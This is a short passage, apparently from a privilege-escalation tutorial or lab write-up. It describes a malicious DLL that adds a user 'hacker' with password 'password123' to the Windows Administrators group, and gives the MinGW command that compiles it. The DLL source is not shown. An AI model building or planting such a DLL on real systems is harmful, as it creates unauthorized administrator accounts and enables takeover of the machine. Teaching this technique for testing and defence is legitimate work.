# **Purpose**:
    Adds a user `hacker` with a password `password123`.
    Elevates the user to the Administrators group.

---

## **5. Compile the Malicious DLL**

- Use MinGW to compile the DLL:

```bash
x86_64-w64-mingw32-gcc adduser_to_dll.cpp --shared -o addUser.dll
```
